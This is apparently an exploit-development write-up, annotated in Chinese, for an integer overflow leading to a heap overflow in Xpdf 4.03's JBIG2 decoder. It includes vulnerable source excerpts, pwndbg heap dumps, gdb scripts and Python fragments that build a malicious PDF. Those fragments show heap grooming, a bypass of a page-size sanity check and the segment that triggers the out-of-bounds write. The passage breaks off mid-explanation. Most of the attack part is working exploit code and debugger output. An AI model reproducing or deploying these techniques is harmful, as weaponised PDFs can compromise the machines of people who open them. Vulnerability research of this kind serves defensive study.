00:0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov r12, rax
01:0008│ 0x7fffffffdd30 ◂— 0x0
02:0010│ 0x7fffffffdd38 ◂— 0x0
03:0018│ 0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001
04:0020│ 0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000
05:0028│ 0x7fffffffdd50 ◂— 0x0
... ↓ 2 skipped
─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► f 0 0x555555675179
 f 1 0x555555676c72
 f 2 0x555555679198 JBIG2Stream::readSegments()+1032
 f 3 0x555555679473 JBIG2Stream::reset()+211
 f 4 0x55555560139a
 f 5 0x5555556494a9
 f 6 0x55555564aba0
 f 7 0x55555563c9e5
```



```
void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length,
 Guint *refSegs, Guint nRefSegs) {
 ...
 Guint numSyms;
 ...
 // get symbol dictionaries and tables
 codeTables = new GList();
 // 1. 初始时为 0
 numSyms = 0; 
 for (i = 0; i < nRefSegs; ++i) {
 if ((seg = findSegment(refSegs[i]))) {
 if (seg->getType() == jbig2SegSymbolDict) {
 // 2. 该变量与一个用户可控的值相加，会造成整数溢出
 numSyms += ((JBIG2SymbolDict *)seg)->getSize();
 } else if (seg->getType() == jbig2SegCodeTable) {
 codeTables->append(seg);
 }
 } else {
 ...
 }
 }
 ...
 // get the symbol bitmaps
 // 3. 整数溢出后，这里分配了一个较小的堆内存（指针数组）
 syms = (JBIG2Bitmap **)gmallocn(numSyms, sizeof(JBIG2Bitmap *));
 kk = 0;
 for (i = 0; i < nRefSegs; ++i) {
 if ((seg = findSegment(refSegs[i]))) {
 if (seg->getType() == jbig2SegSymbolDict) {
 symbolDict = (JBIG2SymbolDict *)seg;
 // 4. 将各个指针写入该堆内存，触发堆溢出
 for (k = 0; k < symbolDict->getSize(); ++k) {
 syms[kk++] = symbolDict->getBitmap(k);
 }
 }
 }
 }
 ...
}
```



```
4 0 obj
<< /Filter /FlateDecode
/Length 3988
>>
stream
/* [MyStream1] */
endstream
endobj

5 0 obj
<< /DecodeParms << /JBIG2Globals 4 0 R >>
/Width 1024
/ColorSpace /DeviceGray
/Height 1
/Filter /JBIG2Decode
/Subtype /Image
/Length 418248
/Type /XObject
/BitsPerComponent 1
>>
stream
/* [MyStream2] */
endstream
endobj
```



```
void JBIG2Stream::reset()
{
 GList *t;

 segments = new GList();
 globalSegments = new GList();

 // read the globals stream
 if (globalsStream.isStream())
 {
 // 解析以 DecodeParms 传来的 global stream 流，即 FlateDecode(MyStream1)
 curStr = globalsStream.getStream();
 curStr->reset();
 // 解析时需要使用到解码器，这里是对解码器进行初始化
 arithDecoder->setStream(curStr);
 huffDecoder->setStream(curStr);
 mmrDecoder->setStream(curStr);
 // 开始读取 segments
 readSegments();
 curStr->close();
 // swap the newly read segments list into globalSegments
 t = segments;
 segments = globalSegments;
 globalSegments = t;
 }

 // read the main stream
 // 解析 main stream, 即 MySteram2
 curStr = str;
 curStr->reset();
 // 同样对解码器进行初始化
 arithDecoder->setStream(curStr);
 huffDecoder->setStream(curStr);
 mmrDecoder->setStream(curStr);
 readSegments();

 if (pageBitmap)
 {
 dataPtr = pageBitmap->getDataPtr();
 dataEnd = dataPtr + pageBitmap->getDataSize();
 }
 else
 {
 dataPtr = dataEnd = NULL;
 }
}
```



```
GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,
 Guint *refSegs, Guint nRefSegs)
{
 [...]
 // 创建 bitmaps 数组
 // get the input symbol bitmaps
 bitmaps = (JBIG2Bitmap **)gmallocn(numInputSyms + numNewSyms,
 sizeof(JBIG2Bitmap *));
 for (i = 0; i < numInputSyms + numNewSyms; ++i)
 {
 bitmaps[i] = NULL;
 }
 k = 0;
 inputSymbolDict = NULL;
 for (i = 0; i < nRefSegs; ++i)
 {
 if ((seg = findSegment(refSegs[i])))
 {
 if (seg->getType() == jbig2SegSymbolDict)
 {
 inputSymbolDict = (JBIG2SymbolDict *)seg;
 for (j = 0; j < inputSymbolDict->getSize(); ++j)
 {
 bitmaps[k++] = inputSymbolDict->getBitmap(j);
 }
 }
 }
 }
 [...]
 // 开始尝试从外部 JBIG2Stream 流中读取 bitmap
 symHeight = 0;
 i = 0;
 while (i < numNewSyms)
 {
 // read the height class delta height
 if (huff) [...]
 else
 {
 arithDecoder->decodeInt(&dh, iadhStats);
 } 
 [...]
 symHeight += dh;
 symWidth = 0;
 totalWidth = 0;
 j = i;

 [...]

 // read the symbols in this height class
 while (1)
 {
 // read the delta width
 if (huff) [...]
 else
 {
 if (!arithDecoder->decodeInt(&dw, iadwStats))
 {
 break;
 }
 }
 [...]

 // using a collective bitmap, so don't read a bitmap here
 if (huff && !refAgg) [...]
 else if (refAgg) [...]
 else
 {
 // 从外部流中读取 bitmap 并将其保存进数组中
 bitmaps[numInputSyms + i] =
 readGenericBitmap(gFalse, symWidth, symHeight,
 sdTemplate, gFalse, gFalse, NULL,
 sdATX, sdATY, 0);
 }

 ++i;
 }

 // read the collective bitmap
 if (huff && !refAgg) [...]
 }
 // 创建了一个 symbolDict 结构体
 // create the symbol dict object
 symbolDict = new JBIG2SymbolDict(segNum, numExSyms);

 // 将上面创建的 bitmaps 数组复制进 symbolDict 结构体中
 // exported symbol list
 i = j = 0;
 ex = gFalse;
 prevRun = 1;
 while (i < numInputSyms + numNewSyms)
 {
 if (huff)
 [...]
 else
 {
 arithDecoder->decodeInt(&run, iaexStats);
 }
 [...]
 if (ex)
 {
 for (cnt = 0; cnt < run; ++cnt)
 {
 // 将上面创建的 bitmaps 对等深拷贝进 symbolDict 中
 symbolDict->setBitmap(j++, bitmaps[i++]->copy());
 }
 }
 else
 {
 i += run;
 }
 ex = !ex;
 prevRun = run;
 }
 [...] // 释放 bitmaps 数组
 // store the new symbol dict
 segments->append(symbolDict);
 [...]
}
```



```
void JBIG2Stream::readPageInfoSeg(Guint length)
{
 Guint xRes, yRes, flags, striping;

 if (!readULong(&pageW) || !readULong(&pageH) ||
 !readULong(&xRes) || !readULong(&yRes) ||
 !readUByte(&flags) || !readUWord(&striping))
 {
 goto eofError;
 }
 [...]
 // 创建流内全局字段 pageBitmap
 pageBitmap = new JBIG2Bitmap(0, pageW, curPageH);

 // default pixel value
 [...]

 return;

eofError:
 error(errSyntaxError, getPos(), "Unexpected EOF in JBIG2 stream");
}
```



```
void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length)
{
 [...]
 // read the bitmap
 bitmap = readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,
 NULL, atx, aty, mmr ? length - 18 : 0);

 // combine the region bitmap into the page bitmap
 if (imm)
 {
 if (pageH == 0xffffffff && y + h > curPageH)
 {
 pageBitmap->expand(y + h, pageDefPixel);
 }
 pageBitmap->combine(bitmap, x, y, extCombOp);
 delete bitmap;

 // store the region bitmap
 }
 [...]
}
```



```
switch (combOp)
{
 case 0: // or
 dest |= src1 & m2;
 break;
 case 1: // and
 dest &= src1 | m1;
 break;
 case 2: // xor
 dest ^= src1 & m2;
 break;
 case 3: // xnor
 dest ^= (src1 ^ 0xff) & m2;
 break;
 case 4: // replace
 dest = (src1 & m2) | (dest & m1);
 break;
}
```



```
void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length,
 Guint *refSegs,
 Guint nRefSegs)
{
 [...]
 if (nRefSegs == 1)
 {
 if (!(seg = findSegment(refSegs[0])) ||
 seg->getType() != jbig2SegBitmap)
 {
 error(errSyntaxError, getPos(),
 "Bad bitmap reference in JBIG2 generic refinement segment");
 return;
 }
 refBitmap = (JBIG2Bitmap *)seg;
 }
 else
 {
 refBitmap = pageBitmap->getSlice(x, y, w, h);
 }
 [...]
 // read
 bitmap = readGenericRefinementRegion(w, h, templ, tpgrOn,
 refBitmap, 0, 0, atx, aty);

 // combine the region bitmap into the page bitmap
 if (imm)
 {
 pageBitmap->combine(bitmap, x, y, extCombOp);
 delete bitmap;

 // store the region bitmap
 }
 else
 {
 bitmap->setSegNum(segNum);
 segments->append(bitmap);
 }
 [...]
}
```



```
+----------------------> x-axis
|
| .(2)
|
| .(1)
|
V 
y-axis
```



```
void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
 GBool lossless, Guint length,
 Guint *refSegs, Guint nRefSegs)
{
 [...]
 // get the symbol bitmaps
 // 从所引用的每个段上，将每个 instance 拷贝到 syms 数组中
 syms = (JBIG2Bitmap **)gmallocn(numSyms, sizeof(JBIG2Bitmap *));
 kk = 0;
 for (i = 0; i < nRefSegs; ++i)
 {
 if ((seg = findSegment(refSegs[i])))
 {
 if (seg->getType() == jbig2SegSymbolDict)
 {
 symbolDict = (JBIG2SymbolDict *)seg;
 for (k = 0; k < symbolDict->getSize(); ++k)
 {
 syms[kk++] = symbolDict->getBitmap(k);
 }
 }
 }
 }
 [...]
 // 执行 readTextRegion 函数，将指定的 syms 与新创建出来的 bitmap 进行 combine 操作
 bitmap = readTextRegion(huff, refine, w, h, numInstances,
 logStrips, numSyms, symCodeTab, symCodeLen, syms,
 defPixel, combOp, transposed, refCorner, sOffset,
 huffFSTable, huffDSTable, huffDTTable,
 huffRDWTable, huffRDHTable,
 huffRDXTable, huffRDYTable, huffRSizeTable,
 templ, atx, aty);

 gfree(syms);

 // combine the region bitmap into the page bitmap
 // 将当前 bitmap 与 pageBitmap 进行 combine 操作，传递所引用的 instance 上的值至 pageBitmap 上
 if (imm)
 {
 if (pageH == 0xffffffff && y + h > curPageH)
 {
 pageBitmap->expand(y + h, pageDefPixel);
 }
 pageBitmap->combine(bitmap, x, y, extCombOp);
 delete bitmap;

 // store the region bitmap
 }
 else
 {
 bitmap->setSegNum(segNum);
 segments->append(bitmap);
 }
 [...]
}
```



```
git clone git@github.com:agl/jbig2enc.git
```



```
sudo apt-get install pybind11-dev
```



```
# global segment
global_file = [
 SymbolDict(0, [Bitmap(1, 1)] * 0x10000),
 SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow // 8)),
 SymbolDict(2, [Bitmap(1, 1)]),
]
```



```
pwndbg> bins
tcachebins
0x20 [ 4]: 0x55555579f8e0 —▸ 0x5555557b9550 —▸ 0x5555557b0c10 —▸ 0x5555557b0c60 ◂— 0x0
0x30 [ 5]: 0x5555557ab330 —▸ 0x5555557b0c30 —▸ 0x5555557b0c80 —▸ 0x555555799280 —▸ 0x5555557992d0 ◂— 0x0
0x40 [ 7]: 0x5555557f7f90 —▸ 0x5555557f8f10 —▸ 0x5555557f9100 —▸ 0x5555557f7bb0 —▸ 0x5555557fe710 —▸ 0x5555557a0320 —▸ 0x555555797210 ◂— 0x0
0x50 [ 1]: 0x5555557a02b0 ◂— 0x0
0x60 [ 4]: 0x5555557ab3c0 —▸ 0x5555557a9e40 —▸ 0x5555557ab890 —▸ 0x5555557ab790 ◂— 0x0
0x70 [ 1]: 0x5555557ac760 ◂— 0x0
0x90 [ 1]: 0x5555557b94c0 ◂— 0x0
0xa0 [ 3]: 0x555555798e00 —▸ 0x5555557b6930 —▸ 0x5555557b6a10 ◂— 0x0
0xb0 [ 2]: 0x5555557ba520 —▸ 0x5555557b9410 ◂— 0x0
0xc0 [ 3]: 0x5555557bec00 —▸ 0x5555557bf620 —▸ 0x5555557b1220 ◂— 0x0
0xd0 [ 5]: 0x555555799ec0 —▸ 0x5555557b0cb0 —▸ 0x5555557c5400 —▸ 0x5555557c37f0 —▸ 0x5555557bfcf0 ◂— 0x0
0xe0 [ 3]: 0x5555557be4b0 —▸ 0x5555557a9a30 —▸ 0x5555557bc750 ◂— 0x0
0xf0 [ 3]: 0x5555557c6d30 —▸ 0x5555557bd370 —▸ 0x5555557bd4a0 ◂— 0x0
0x100 [ 2]: 0x5555557c4360 —▸ 0x5555557c44a0 ◂— 0x0
0x110 [ 1]: 0x555555797100 ◂— 0x0
0x120 [ 2]: 0x5555557c1000 —▸ 0x5555557c5880 ◂— 0x0
0x140 [ 3]: 0x5555557c7c80 —▸ 0x5555557c7430 —▸ 0x5555557cc180 ◂— 0x0
0x150 [ 3]: 0x5555557cdac0 —▸ 0x5555557c83f0 —▸ 0x5555557c8590 ◂— 0x0
0x160 [ 2]: 0x55555579fc00 —▸ 0x5555557a4420 ◂— 0x0
0x170 [ 3]: 0x555555797c20 —▸ 0x5555557d36c0 —▸ 0x5555557d3550 ◂— 0x0
0x180 [ 2]: 0x5555557bff50 —▸ 0x5555557d8010 ◂— 0x0
0x190 [ 7]: 0x5555557adb80 —▸ 0x5555557d8530 —▸ 0x5555557ad570 —▸ 0x5555557ac7d0 —▸ 0x5555557a8710 —▸ 0x5555557a8d60 —▸ 0x5555557aad00 ◂— 0x0
0x1a0 [ 2]: 0x5555557d2890 —▸ 0x5555557ad700 ◂— 0x0
0x1b0 [ 2]: 0x5555557a8ef0 —▸ 0x5555557aea50 ◂— 0x0
0x1c0 [ 2]: 0x5555557d1bb0 —▸ 0x55555579ad70 ◂— 0x0
0x1d0 [ 2]: 0x555555796b00 —▸ 0x555555796640 ◂— 0x0
0x1f0 [ 2]: 0x5555557a6410 —▸ 0x5555557a6220 ◂— 0x0
0x200 [ 2]: 0x55555576a670 —▸ 0x5555557aae90 ◂— 0x0
0x220 [ 2]: 0x5555557d8310 —▸ 0x5555557ac960 ◂— 0x0
0x230 [ 1]: 0x5555557bd980 ◂— 0x0
0x270 [ 1]: 0x5555557ba6d0 ◂— 0x0
0x2b0 [ 1]: 0x5555557abdc0 ◂— 0x0
0x2c0 [ 1]: 0x555555798320 ◂— 0x0
0x2e0 [ 1]: 0x5555557aa730 ◂— 0x0
0x300 [ 2]: 0x5555557a5c60 —▸ 0x5555557a9590 ◂— 0x0
0x310 [ 7]: 0x5555557ae510 —▸ 0x5555557ac110 —▸ 0x5555557ad010 —▸ 0x5555557abab0 —▸ 0x5555557a9280 —▸ 0x5555557aa420 —▸ 0x5555557a76c0 ◂— 0x0
0x320 [ 3]: 0x555555799f90 —▸ 0x5555557becc0 —▸ 0x5555557bab30 ◂— 0x0
0x350 [ 2]: 0x5555557bcb40 —▸ 0x5555557c3bd0 ◂— 0x0
0x390 [ 1]: 0x5555557a88a0 ◂— 0x0
0x3b0 [ 2]: 0x555555797250 —▸ 0x5555557a79d0 ◂— 0x0
0x3c0 [ 1]: 0x5555557d39d0 ◂— 0x0
0x3d0 [ 1]: 0x5555557cccc0 ◂— 0x0
0x400 [ 1]: 0x55555576aa50 ◂— 0x0
0x410 [ 3]: 0x555555797810 —▸ 0x5555557bf1d0 —▸ 0x5555557a7f90 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555558304b0 —▸ 0x7ffff7ad8c00 (main_arena+96) ◂— 0x5555558304b0
smallbins
0x20: 0x5555557a99e0 —▸ 0x7ffff7ad8c10 (main_arena+112) ◂— 0x5555557a99e0
0xb0: 0x5555557f82f0 —▸ 0x7ffff7ad8ca0 (main_arena+256) ◂— 0x5555557f82f0
0xf0: 0x5555557d0ab0 —▸ 0x7ffff7ad8ce0 (main_arena+320) ◂— 0x5555557d0ab0
0x120: 0x5555557992f0 —▸ 0x7ffff7ad8d10 (main_arena+368) ◂— 0x5555557992f0
0x190: 0x5555557f7df0 —▸ 0x5555557f8d70 —▸ 0x5555557f8f60 —▸ 0x5555557f7a10 —▸ 0x5555557fe570 ◂— ...
0x1c0 [corrupted]
FD: 0x5555557f1a30 —▸ 0x5555557f4780 —▸ 0x5555557d15f0 —▸ 0x5555557e49d0 —▸ 0x55555579ecf0 ◂— ...
BK: 0x5555557d0c90 —▸ 0x5555557d06f0 —▸ 0x5555557d1410 —▸ 0x5555557d0e70 —▸ 0x55555579e390 ◂— ...
0x1d0 [corrupted]
FD: 0x5555557f9910 —▸ 0x5555557f9720 —▸ 0x5555557f85b0 —▸ 0x5555557fe960 —▸ 0x5555557f66b0 ◂— ...
BK: 0x5555557f9530 —▸ 0x5555557f9150 —▸ 0x5555557fb050 —▸ 0x5555557fdd90 —▸ 0x5555557fd1e0 ◂— ...
0x1e0 [corrupted]
FD: 0x5555557a13c0 —▸ 0x5555557a0bc0 —▸ 0x5555557a11c0 —▸ 0x5555557a0570 —▸ 0x5555557a0770 ◂— ...
BK: 0x5555557fcbf0 —▸ 0x5555557fc9f0 —▸ 0x5555557fdb90 —▸ 0x5555557fe760 —▸ 0x5555557fc210 ◂— ...
0x1f0: 0x5555557ba930 —▸ 0x5555557f1120 —▸ 0x5555557d19b0 —▸ 0x5555557befd0 —▸ 0x7ffff7ad8de0 (main_arena+576) ◂— ...
0x200: 0x5555557a9b00 —▸ 0x5555557df570 —▸ 0x5555557a8500 —▸ 0x7ffff7ad8df0 (main_arena+592) ◂— 0x5555557a9b00
0x220 [corrupted]
FD: 0x5555557f3c20 —▸ 0x5555557ecce0 —▸ 0x5555557e8180 —▸ 0x5555557f57f0 —▸ 0x5555557ee5a0 ◂— ...
BK: 0x5555557f4540 —▸ 0x5555557f2130 —▸ 0x5555557f27e0 —▸ 0x5555557eec60 —▸ 0x5555557f2ea0 ◂— ...
0x230 [corrupted]
FD: 0x5555557ae810 —▸ 0x5555557f49d0 —▸ 0x5555557e2710 —▸ 0x5555557f4c20 —▸ 0x5555557a0970 ◂— ...
BK: 0x5555557f0a20 —▸ 0x5555557a23a0 —▸ 0x5555557e5a20 —▸ 0x5555557a3d20 —▸ 0x5555557a3f70 ◂— ...
0x240 [corrupted]
FD: 0x5555557f5590 —▸ 0x5555557f1330 —▸ 0x5555557e3730 —▸ 0x5555557f4e70 —▸ 0x5555557a1ef0 ◂— ...
BK: 0x5555557ec840 —▸ 0x5555557f50d0 —▸ 0x5555557a4660 —▸ 0x5555557e4090 —▸ 0x5555557f5330 ◂— ...
0x250: 0x55555579a760 —▸ 0x7ffff7ad8e40 (main_arena+672) ◂— 0x55555579a760
0x270 [corrupted]
FD: 0x5555557dd3a0 —▸ 0x5555557e1a10 —▸ 0x5555557e0810 —▸ 0x5555557e02e0 —▸ 0x5555557e0aa0 ◂— ...
BK: 0x5555557a54a0 —▸ 0x5555557a5210 —▸ 0x5555557e1f40 —▸ 0x5555557e0aa0 —▸ 0x5555557e02e0 ◂— ...
0x280 [corrupted]
FD: 0x5555557c7560 —▸ 0x5555557b0d70 —▸ 0x5555557e0570 —▸ 0x5555557df2d0 —▸ 0x5555557df810 ◂— ...
BK: 0x5555557e21d0 —▸ 0x5555557deaf0 —▸ 0x5555557df030 —▸ 0x5555557e2470 —▸ 0x5555557ded90 ◂— ...
0x290: 0x5555557acb70 —▸ 0x5555557ddb10 —▸ 0x5555557e0030 —▸ 0x5555557e1760 —▸ 0x5555557de5a0 ◂— ...
0x2a0: 0x5555557dfd70 —▸ 0x5555557dfab0 —▸ 0x7ffff7ad8e90 (main_arena+752) ◂— 0x5555557dfd70
0x2c0: 0x5555557a5f50 —▸ 0x5555557f5c90 —▸ 0x7ffff7ad8eb0 (main_arena+784) ◂— 0x5555557a5f50 /* 'P_zUUU' */
0x340: 0x5555557f5f70 —▸ 0x5555557ac410 —▸ 0x7ffff7ad8f30 (main_arena+912) ◂— 0x5555557f5f70
0x380: 0x5555557c69a0 —▸ 0x7ffff7ad8f70 (main_arena+976) ◂— 0x5555557c69a0
0x390: 0x5555557d7c70 —▸ 0x7ffff7ad8f80 (main_arena+992) ◂— 0x5555557d7c70 /* 'p|}UUU' */
0x3b0: 0x5555557c54c0 —▸ 0x7ffff7ad8fa0 (main_arena+1024) ◂— 0x5555557c54c0
0x3f0: 0x5555557bd580 —▸ 0x7ffff7ad8fe0 (main_arena+1088) ◂— 0x5555557bd580
largebins
0x580: 0x5555557cc2b0 —▸ 0x555555797d80 —▸ 0x7ffff7ad9050 (main_arena+1200) ◂— 0x5555557cc2b0
0x600: 0x5555557c7db0 —▸ 0x7ffff7ad9070 (main_arena+1232) ◂— 0x5555557c7db0
0x640: 0x5555557be580 —▸ 0x7ffff7ad9080 (main_arena+1248) ◂— 0x5555557be580
0x780: 0x5555557ea9f0 —▸ 0x5555557cb9e0 —▸ 0x7ffff7ad90d0 (main_arena+1328) ◂— 0x5555557ea9f0
0x800: 0x5555557985d0 —▸ 0x7ffff7ad90f0 (main_arena+1360) ◂— 0x5555557985d0
0x840: 0x5555557cdc00 —▸ 0x7ffff7ad9100 (main_arena+1376) ◂— 0x5555557cdc00
0x900: 0x5555557bdba0 —▸ 0x7ffff7ad9130 (main_arena+1424) ◂— 0x5555557bdba0
0x940: 0x5555557e77f0 —▸ 0x5555557e9b00 —▸ 0x7ffff7ad9140 (main_arena+1440) ◂— 0x5555557e77f0
0x980: 0x5555557d86b0 —▸ 0x5555557ebea0 —▸ 0x7ffff7ad9150 (main_arena+1456) ◂— 0x5555557d86b0
0x9c0: 0x555555795c40 —▸ 0x7ffff7ad9160 (main_arena+1472) ◂— 0x555555795c40 /* '@\yUUU' */
0xa00: 0x5555557cd080 —▸ 0x7ffff7ad9170 (main_arena+1488) ◂— 0x5555557cd080
0xa40: 0x555555799440 —▸ 0x5555557d1e40 —▸ 0x7ffff7ad9180 (main_arena+1504) ◂— 0x555555799440
0xac0: 0x5555557e83c0 —▸ 0x5555557e6100 —▸ 0x7ffff7ad91a0 (main_arena+1536) ◂— 0x5555557e83c0
0xb00: 0x5555557d2a20 —▸ 0x7ffff7ad91b0 (main_arena+1552) ◂— 0x5555557d2a20 /* ' *}UUU' */
0xb40: 0x5555557e6c70 —▸ 0x5555557feb50 —▸ 0x7ffff7ad91c0 (main_arena+1568) ◂— 0x5555557e6c70 /* 'pl~UUU' */
0xc40: 0x5555557eb210 —▸ 0x5555557e8ea0 —▸ 0x7ffff7ad9200 (main_arena+1632) ◂— 0x5555557eb210
0xe00: 0x5555557c00c0 —▸ 0x5555557b9630 —▸ 0x5555557c4590 —▸ 0x7ffff7ad9210 (main_arena+1648) ◂— 0x5555557c00c0
0x1400: 0x5555557b5420 —▸ 0x7ffff7ad9240 (main_arena+1696) ◂— 0x5555557b5420 /* ' T{UUU' */
0x1600: 0x5555557ce770 —▸ 0x7ffff7ad9250 (main_arena+1712) ◂— 0x5555557ce770
0x1800: 0x5555557bae40 —▸ 0x7ffff7ad9260 (main_arena+1728) ◂— 0x5555557bae40
0x2600: 0x5555557b6aa0 —▸ 0x5555557c1110 —▸ 0x7ffff7ad92d0 (main_arena+1840) ◂— 0x5555557b6aa0
0x2a00: 0x55555579af20 —▸ 0x7ffff7ad92f0 (main_arena+1872) ◂— 0x55555579af20
0x3000: 0x5555557d3d80 —▸ 0x5555557d9b60 —▸ 0x5555557c88a0 —▸ 0x7ffff7ad9300 (main_arena+1888) ◂— 0x5555557d3d80
```



```
def DummyAlloc(size):
 return PageInfo(233, w=8, h=size)

global_file = [
 SymbolDict(0, [Bitmap(1, 1)] * 0x10000),
 SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow // 8)),
 SymbolDict(2, [Bitmap(1, 1)]),
 # Heap grooming: eat every chunk in {tcache,fast,small,large,unsorted} bins
 [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],
 [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],
]
```



```
pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x20 [corrupted]
FD: 0x55555579d9f0 —▸ 0x5555557d2860 —▸ 0x555555798db0 —▸ 0x5555557d7fe0 —▸ 0x5555557d7c30 ◂— ...
BK: 0x5555557f96e0 —▸ 0x5555557f9300 —▸ 0x5555557fb200 —▸ 0x5555557fdf40 —▸ 0x5555557fd390 ◂— ...
largebins
empty
```



```
GList::GList() {
 size = 8;
 data = (void **)gmallocn(size, sizeof(void*));
 length = 0;
 inc = 0;
}

void GList::append(void *p) {
 if (length >= size) {
 expand();
 }
 data[length++] = p;
}

void GList::expand() {
 size += (inc > 0) ? inc : size;
 data = (void **)greallocn(data, size, sizeof(void*));
}
```



```
global_file = [
 SymbolDict(0, [Bitmap(1, 1)] * 0x10000),
 SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow // 8)),
 SymbolDict(2, [Bitmap(1, 1)]),
 # Heap grooming: eat every chunk in {tcache,fast,small,large,unsorted} bins
 [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],
 [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],
 # ------------ 开始尝试堆风水 ------------
 [SymbolDict(i, []) for i in range(3, glist_capacity // 2)],
 # Now most bins are empty, except tcachebin 0x20, 0x50 and small bin 0x20
 # This triggers GList::expand(), 0x80 -> 0x100; allocates from top chunk
 SymbolDict(glist_capacity // 2, []),
 [SymbolDict(i, []) for i in range(glist_capacity // 2 + 1, glist_capacity)],
 # 0x100 -> 0x200, the old chunk should fall in tcache
 SymbolDict(100, []),
]
```



```
// low address --------------------------------------------
/* 
 一些其他的堆块分配，包括 
 1. size=8 的 global GList backing store
 2. DummyAlloc
 3. SymbolDict0、1、2
 4. ...
*/
SymbolDict3-8;
size=16 的 global GList backing store 堆空洞
SymbolDict9-16;
size=32 的 global GList backing store 堆空洞
SymbolDict17-32;
size=64 的 global GList backing store // 最终的 GList data 堆位置，这里可不是堆空洞
// high address -------------------------------------------
```



```
file ../../xpdf-4.03/build/xpdf/pdftohtml
aslr off
set follow-fork-mode parent

b readSymbolDictSeg if segNum==8
commands
 printf "sakura in read symbol 8n"

 printf "globalSegments addr is:0x%llxn", segments
 printf "segments GList backing buffern"
 p *(GList *)segments
 # tcachebins
 bins
 # c
end
b readSymbolDictSeg if segNum==16
commands
 printf "sakura in read symbol 16n"

 printf "globalSegments addr is:0x%llxn", segments
 printf "segments GList backing buffern"
 p *(GList *)segments
 # tcachebins
 bins
 # c
end
b readSymbolDictSeg if segNum==100
commands
 printf "sakura in read symbol 32n"

 printf "globalSegments addr is:0x%llxn", segments
 printf "segments GList backing buffern"
 p *(GList *)segments
 # tcachebins
 bins
 
 tb JBIG2Stream.cc:1481
 commands
 printf "after finish globalSegments addr is:0x%llxn", segments
 p *(GList *)segments
 # tcachebins
 bins
 end
 # replace finish and print info
 # c
end

b JBIG2Stream.cc:2072 if segNum==102
commands
 printf "sakura in TextRegion to trigger oobn"
 printf "numSyms after underoverflow is:0x%llxn", numSyms
 set $oob_syms = $rax
 printf "undersized syms buffer addr is:0x%llxn", $oob_syms

 printf "globalSegments addr is:0x%llxn", globalSegments
 printf "segments GList backing buffern"
 p *(GList *)globalSegments

 printf "pageBitmap addr is :0x%llxn", pageBitmap
 p *(JBIG2Bitmap *)pageBitmap
 bins

end

r sploit.pdf output
```



```
page0 = [
 # Make sure page bitmap buffer uses the second-last globalSegments data buffer so
 # that it lies just before syms, at a fixed offset.
 # GLIST_DATA_SIZE // 4，表示占据 size=16 时的 glist 堆空洞
 PageInfo(101, w=8 * (GLIST_DATA_SIZE // 4), h=1),
]
```



```
// low address --------------------------------------------
/* 
 一些其他的堆块分配，包括 
 1. size=8 的 global GList backing store
 2. DummyAlloc
 3. SymbolDict0、1、2
 4. ...
*/
SymbolDict3-8;

// 注意这里！
pageBitmap backing buffer // size=16 的 global GList backing store 堆空洞
 
SymbolDict9-16;

size=32 的 global GList backing store 堆空洞
 
SymbolDict17-32;

size=64 的 global GList backing store; // 最终的 GList data 堆位置，这里可不是堆空洞

// 注意这里！
pageBitmap JBIG2Bitmap; 结构体 
 
// high address -------------------------------------------
```



```
// sanity check: if the w/h/x/y values are way out of range, it likely
// indicates a damaged JBIG2 stream
if (w / 10 > pageW || h / 10 > pageH ||
 x / 10 > pageW || y / 10 > pageH) {
 error(errSyntaxError, getPos(),
 "Bad size or position in JBIG2 text region segment");
 done = gTrue;
 return;
}
```



```
void JBIG2Stream::readPageInfoSeg(Guint length)
{
 Guint xRes, yRes, flags, striping;
 // 从不受信任的流中直接读入 pageW 和 pageH
 if (!readULong(&pageW) || !readULong(&pageH) ||
 !readULong(&xRes) || !readULong(&yRes) ||
 !readUByte(&flags) || !readUWord(&striping))
 {
 goto eofError;
 }
 // 如果 pageW 和 pageH 过大
 if (pageW == 0 || pageH == 0 || pageW > INT_MAX / pageW)
 {
 // 则直接退出 pageInfoSeg 的解析
 error(errSyntaxError, getPos(), "Bad page size in JBIG2 stream");
 return;
 }
 [...]
}
```



```
page0 = [
 # Make sure page bitmap buffer uses the second-last globalSegments data buffer so
 # that it lies just before syms, at a fixed offset.
 PageInfo(101, w=8 * (GLIST_DATA_SIZE // 4), h=1),
 # Change pageH and pageW to a large value to bypass a (seriously funny) sanity
 # check introduced in Xpdf 4.03; Xpdf would report an error without allocating
 # a new pageBitmap, but won't stop parsing the JBIG2 stream, which is exactly what
 # we want.
 PageInfo(101, w=1919114514, h=1919114514),
]
```



```
# Trigger the out-of-bound write.
TextRegion(
 102,
 w=1,
 h=1,
 x=0,
 y=0,
 # size_to_overflow // 8 个指针
 ref_segs=[1] 
 # 0x10000 + (syms_size - size_to_overflow) // 8 个指针
 + [2] * (0x10000 + (syms_size - size_to_overflow) // 8)
 # 共 0xffff0000 个指针
 + [0] * 0xFFFF, 
),
```



```
// low address --------------------------------------------
/* 
 一些其他的堆块分配，包括 
 1. size=8 的 global GList backing store
 2. DummyAlloc
 3. SymbolDict0、1、2
 4. ...
*/
SymbolDict3-8;
pageBitmap backing buffer // size=16 的 global GList backing store 堆空洞
SymbolDict9-16;

// 从此处开始写入数据
syms // syms 的 size 为 syms_size
